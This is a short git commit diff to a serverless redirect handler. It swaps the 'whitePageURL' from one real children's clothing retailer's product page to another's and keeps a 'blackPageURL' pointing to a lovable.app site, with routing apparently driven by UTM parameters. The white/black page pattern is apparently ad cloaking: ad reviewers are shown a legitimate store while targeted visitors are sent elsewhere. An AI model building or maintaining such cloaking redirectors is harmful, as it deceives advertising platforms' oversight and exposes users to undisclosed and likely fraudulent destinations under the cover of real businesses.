514665b2344290e453b97a2505d06098b5380d3f
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-06 02:57:12 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.shoppiccoliandco.com/collections/fw-24-25/products/paulina-pink-romper";
+    const whitePageURL = "https://arabellaandrose.com.au/collections/baby-girl/products/mermaid-sequin-romper-green";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
